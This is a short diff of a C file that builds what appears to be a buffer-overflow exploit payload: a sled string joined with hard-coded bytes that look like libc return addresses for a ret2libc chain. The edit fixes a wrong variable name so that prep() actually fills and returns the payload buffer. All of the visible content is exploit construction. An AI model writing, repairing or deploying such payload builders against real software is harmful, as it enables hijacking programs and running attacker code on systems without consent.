@@ -11,7 +11,7 @@ const char* ADD = "\x60\x43\xe1\xf7\xc0\x6e\xe0\xf7\x63\xf3\xf5\xf7";
 
 char* prep() {
     char* buf = malloc(strlen(SLED) + strlen(ADD) + 1);
-    sprintf(payload, "%s%s", SLED, ADD);
+    sprintf(buf, "%s%s", SLED, ADD);
     return buf;
 }
 
